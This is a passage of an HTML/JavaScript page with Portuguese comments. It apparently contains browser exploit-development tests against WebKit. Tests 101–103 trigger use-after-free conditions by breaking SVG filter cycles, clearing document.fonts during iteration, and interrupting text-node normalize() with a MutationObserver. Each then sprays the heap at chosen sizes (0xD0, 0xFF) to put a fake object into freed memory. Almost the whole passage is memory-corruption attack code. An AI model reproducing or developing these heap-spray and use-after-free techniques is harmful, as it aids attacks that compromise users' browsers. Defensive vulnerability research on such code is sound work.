            rect.setAttribute("height", "100");
            svg.appendChild(rect);
            document.body.appendChild(svg);
            
            // Trigger: Renderização
            // Tenta forçar layout. O browser tenta resolver F1 -> F2 -> F1...
            // Interrompemos removendo F2.
            setTimeout(() => {
                log("Quebrando ciclo...");
                f2.remove();
                sprayHeap('0xD0');
                
                // Força repaint no elemento órfão
                rect.style.display = "none";
                rect.offsetHeight;
                rect.style.display = "block";
            }, 10);
            
            setTimeout(() => {
                log("Teste 101 fim.");
                svg.remove();
            }, 1000);
        }

        // --- TESTE 102: FontFaceSet Iterator Invalidation Loop ---
        // Lógica Complexa: Modificar um Set (document.fonts) enquanto itera sobre ele.
        // Usamos um iterador personalizado para tentar confundir o cursor C++.
        function runTest102() {
            log("Iniciando Test 102: FontSet Invalid...");
            
            // Popula
            for(let i=0; i<100; i++) document.fonts.add(new FontFace(`T${i}`, 'url(x)'));
            
            let iter = document.fonts.values();
            let count = 0;
            
            function step() {
                let next = iter.next();
                if (next.done) return;
                
                count++;
                // No item 50, limpamos tudo
                if (count === 50) {
                    log("Limpando FontSet no meio da iteração...");
                    document.fonts.clear(); 
                    sprayHeap('0xFF');
                    
                    // Tenta continuar iterando no set vazio/corrompido
                    try {
                        let zombie = iter.next();
                        log("Iterador Zumbi: " + zombie.value);
                    } catch(e) { log("Erro iterador: " + e); }
                } else {
                    // Loop rápido para estressar
                    if (count < 100) step(); 
                }
            }
            step();
        }

        // --- TESTE 103: TextNode Split/Merge Feng Shui (Target 0xFF) ---
        // Lógica Complexa: Alvo direto no tamanho 255 bytes (0xFF) do seu JSON.
        // Criamos nós de texto desse tamanho, dividimos (splitText) e juntamos (normalize).
        // Usamos MutationObserver para interferir na fusão.
        function runTest103() {
            log("Iniciando Test 103: Feng Shui 0xFF...");
            
            let container = document.createElement('div');
            document.body.appendChild(container);
            
            // Cria string que resulta em objeto de tamanho próximo a 0xFF no WebKit
            // Strings são UTF-16 (2 bytes). 120 chars * 2 = 240 bytes + header overhead ~= 255
            let txt = "A".repeat(120); 
            
            let t1 = document.createTextNode(txt);
            let t2 = document.createTextNode(txt);
            container.appendChild(t1);
            container.appendChild(t2);
            
            // Observer: Interrompe a fusão
            let obs = new MutationObserver(() => {
                log("Observer: Fusão detectada. Substituindo memória...");
                
                // O normalize está fundindo t2 em t1.
                // Nós removemos t1 e t2.
                container.innerHTML = "";
                
                // ALOCAÇÃO PRECISA: Tentamos colocar nosso objeto fake no lugar de t1/t2
                // Usamos ArrayBuffers de tamanho 255 (0xFF)
                sprayHeap('0xFF');
            });
            
            obs.observe(container, {childList: true});
            
            try {
                log("Normalizando (Merge)...");
                container.normalize();
                log("Fim.");
            } catch(e) { log("Erro: " + e); }
        }



    </script>
</body>
</html>
